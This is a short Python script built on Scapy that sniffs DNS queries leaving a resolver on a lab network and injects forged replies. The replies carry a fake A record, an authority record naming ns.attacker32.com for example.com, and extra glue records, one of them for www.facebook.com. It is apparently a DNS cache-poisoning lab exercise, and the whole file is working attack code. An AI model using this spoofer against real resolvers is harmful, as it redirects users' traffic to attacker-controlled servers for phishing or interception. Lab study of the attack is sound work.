#!/usr/bin/env python3
from scapy.all import *
import sys

NS_NAME="example.com"
def spoof_dns(pkt):
  if (DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode('utf-8')):
    print(pkt.sprintf("{DNS:%IP.src%-->%IP.dst%: %DNS.id%}"))
    # Swap the source and destination IP address
    IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)

    # Swap the source and destination port number
    UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)

    # The Answer Section
    Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                 ttl=259200, rdata='6.6.6.6')
    # The Authority Section
    NSsec1 = DNSRR(rrname='example.com.', type='NS',ttl=259200, rdata='ns.attacker32.com.')
    NSsec2 = DNSRR(rrname='example.com', type='NS',ttl=259200, rdata='ns.example.com.')
    # The Additional Section
    Addsec1 = DNSRR(rrname='ns.attacker32.com.', type='A',ttl=259200, rdata='1.2.3.4')
    Addsec2 = DNSRR(rrname='ns2.example.net.', type='A',ttl=259200, rdata='5.6.7.8')
    Addsec3 = DNSRR(rrname='www.facebook.com.', type='A',ttl=259200, rdata='3.4.5.6')

    ## DNSpkt
    DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,  
                 qdcount=1, ancount=1, nscount=2, arcount=3,an=Anssec,ns=NSsec1/NSsec2,ar=Addsec1/Addsec2/Addsec3)
    spoofpkt = IPpkt/UDPpkt/DNSpkt
    send(spoofpkt)

# Sniff UDP query packets and invoke spoof_dns().
f = "udp and src host 10.9.0.53 and dst port 53"
#br-0a8cdae26a1f
pkt = sniff(iface="br-3cd8eb257d71", filter=f, prn=spoof_dns)      
